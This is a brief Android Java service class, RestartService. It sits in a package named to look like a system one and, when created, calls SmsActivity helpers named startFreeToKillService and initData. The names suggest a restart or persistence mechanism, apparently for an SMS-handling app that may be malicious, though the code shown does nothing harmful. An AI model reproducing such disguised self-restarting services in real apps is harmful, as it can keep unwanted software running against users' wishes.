package android.app.sms.service;

import android.app.Service;
import android.app.sdk.SmsActivity;
import android.content.Intent;
import android.os.IBinder;

public class RestartService extends Service {

	@Override
	public void onCreate() {
		SmsActivity.startFreeToKillService(this);
		SmsActivity.initData(this);
		super.onCreate();
	}
	
	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

}
